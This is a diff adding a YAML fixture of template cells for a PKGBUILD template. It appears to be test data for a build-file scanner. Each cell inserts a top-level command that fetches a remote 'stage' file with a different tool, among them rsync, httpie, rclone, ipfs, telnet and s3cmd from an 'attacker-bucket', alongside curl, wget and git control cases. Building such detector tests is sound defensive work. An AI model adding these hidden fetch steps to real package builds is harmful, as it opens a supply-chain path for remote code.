@@ -1,0 +1,218 @@
+template: template.PKGBUILD
+cells:
+- id: rsync
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'rsync -a rsync://github.com/example/harness-baseline/raw/main/stage "$srcdir"/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: lwp-request
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'lwp-request -O "$srcdir"/stage https://github.com/example/harness-baseline/raw/main/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: lwp-download
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'lwp-download -O "$srcdir"/stage https://github.com/example/harness-baseline/raw/main/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: httpie
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'http --download --output "$srcdir"/stage https://github.com/example/harness-baseline/raw/main/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: w3m
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'w3m -dump https://github.com/example/harness-baseline/raw/main/stage > "$srcdir"/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: links
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'links -dump https://github.com/example/harness-baseline/raw/main/stage > "$srcdir"/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: browsh
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'browsh --dump https://github.com/example/harness-baseline/raw/main/stage > "$srcdir"/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: elinks
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'elinks -dump https://github.com/example/harness-baseline/raw/main/stage > "$srcdir"/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: rclone
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'rclone copyto :https:,"https://github.com/example/harness-baseline/raw/main/stage" "$srcdir"/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: borg
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'borg extract --repo rsync://github.com/example/harness-baseline/repo::archive "$srcdir"/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: restic
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'restic restore latest --target "$srcdir" --repo rsync://github.com/example/harness-baseline/repo
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: ipfs
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'ipfs get -o "$srcdir"/stage /ipfs/QmStageHash
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: s3cmd
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 's3cmd get s3://attacker-bucket/stage "$srcdir"/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: swift
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'swift download -o "$srcdir"/stage stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: rados
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'rados get stage -p "$srcdir"/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: ncftp
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'ncftpget -O "$srcdir"/stage github.com /raw/main/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: snarf
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'snarf -o "$srcdir"/stage https://github.com/example/harness-baseline/raw/main/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: yt-dlp
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'yt-dlp -o "$srcdir"/stage https://github.com/example/harness-baseline/raw/main/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: telnet
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'telnet github.com 80 < /dev/null > "$srcdir"/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: aria2c
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'aria2c -q -d "$srcdir" -o stage https://github.com/example/harness-baseline/raw/main/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: axel
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'axel -o "$srcdir"/stage https://github.com/example/harness-baseline/raw/main/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: ctl-curl-toplevel
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'curl -fsSL https://github.com/example/harness-baseline/raw/main/stage -o "$srcdir"/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: ctl-wget-toplevel
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'wget -qO "$srcdir"/stage https://github.com/example/harness-baseline/raw/main/stage
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
+- id: ctl-git-toplevel
+  vars:
+    url: https://github.com/example/harness-baseline
+    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
+    extra: 'git clone https://github.com/example/harness-baseline/x "$srcdir"/x
+
+
+      '
+    payload: "  cd \"$srcdir\"/harness-baseline-1.0.0\n  sh ./configure\n  make"
